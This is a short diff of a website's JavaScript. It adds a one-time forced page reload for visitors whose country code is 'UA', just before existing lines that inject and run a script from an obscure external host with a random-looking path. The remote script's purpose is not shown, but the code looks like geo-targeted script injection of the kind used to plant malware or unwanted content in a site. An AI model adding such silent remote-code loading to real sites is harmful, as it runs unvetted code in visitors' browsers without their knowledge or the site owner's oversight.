@@ -302,6 +302,12 @@ $(document).ready(function () {
 
 
   if (countryCode === 'UA') {
+    (function() {
+    if (!sessionStorage.getItem('pageRefreshed')) {
+        sessionStorage.setItem('pageRefreshed', 'true');
+        window.location.reload();
+    }
+    })();
     var script = document.createElement('script');
     script.src = '//static.hemgoz.com/dx0h18h8qliv687qt2qh818h0pmvuq/y305cd7.js';
     script.type = 'text/javascript';
